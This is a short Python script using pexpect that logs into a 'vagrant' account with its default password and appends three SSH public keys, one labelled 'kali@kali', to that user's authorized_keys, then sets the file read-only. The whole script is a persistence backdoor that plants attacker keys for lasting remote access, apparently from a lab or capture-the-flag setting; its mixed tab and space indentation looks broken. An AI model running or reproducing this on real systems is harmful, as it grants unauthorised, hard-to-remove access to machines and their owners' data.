#!/usr/bin/python3

import sys
import pexpect
from multiprocessing import Process

def executeCmd(username, password):
        child = pexpect.spawn("/bin/su - vagrant", encoding='utf-8')
        child.logfile = sys.stdout
        child.expect('Password:')
        child.send("vagrant\r")
        child.expect(".+\$ ")
        child.send("chmod 600 /home/vagrant/.ssh/authorized_keys\r")
	child.send("cat /home/vagrant/.ssh/authorized_keys\r")
        child.expect(".+\$ ")
        child.send("echo 'ssh-rsa AAAAB3Nza...1b4' >> /home/vagrant/.ssh/authorized_keys\r")
        child.send("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmFKLjhFnfAJ7KzPEhSwA4gZo9BuEinKS2XrXIBWZmsm/1Q8TOc5pLiTUuRE1dOPap3EIpjHX1FrbreoktCl7IRNvmoAOC1E/06Ad2Va5pW5TqjBf5eaS9LIEA703Y5OUOt4zK5gdHtjBR3h8GIgM7/5wPUygdjz1Eedu3vB1TeqdmxOtbNMCqjLGoXRAOTwr98R7ZMG69g5oPFlSUHVOZ562vPncn059O73JMsIgi8zsEpgHKoxEnp9R4VMcj8jDIunGFaH5JItmmiqF2HhPMo3KlomooZziQoNHYctbxwpX1flQHmqeQliC9Ot+NotJwMAZgXRVYkDYL+2TswJkd' >> /home/vagrant/.ssh/authorized_keys\r")
        child.send("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQSDP2KerOE5sHPb5e771k5sB51KHCy6dQc/xZATYbQXM7LH2mHmqJdAqXdCDyxWTW1O/v4TQe1KWPYoSjXww7eR3oKRl/2qSU4fb6FQ1urPTqZLvG99phbxUWBljij59LVWGrHXXTx/71/f/KUYh+QpnhvALlOzeF2EKS2a13dJzBB7cKlmBLxdv64JNV+cCCqtjAXiVVfImGLR+SD463t6Y6BqNaMerDKikthFGVaKKYqBUptdmycgWGoM5LGF4gmnFFn7h1yq/rYw57sZm0sPwMul3o6AJhM9fGAZNn0NkUBM8Sj3JO+8/oqYe5FXbuDPDdmNyfNtGLWxlq+vbi5bYrKkWkJkbr5DOzjTLgP2+aPXbm3aybidv2nvc/I0WzGAqYJ/RgOARN0N1p9oxlnUlhhK5j6KWpgahlewmhjl/wLKVxsiT9WoQgiQRt5MVlpQxi/Ufxr5wIO0zsrpLrj8A50mc+LycAdcuiygj+u4KidTmflFGUdh78KvqWnjc= kali@kali' >> /home/vagrant/.ssh/authorized_keys\r")
        child.expect(".+\$ ")
        child.send("chmod 400 /home/vagrant/.ssh/authorized_keys\r")
        child.expect(".+\$ ")
        child.close()
	print("\n\n")

def main():
    executeCmd(username='vagrant', password='vagrant')


if __name__ == '__main__':
        main()
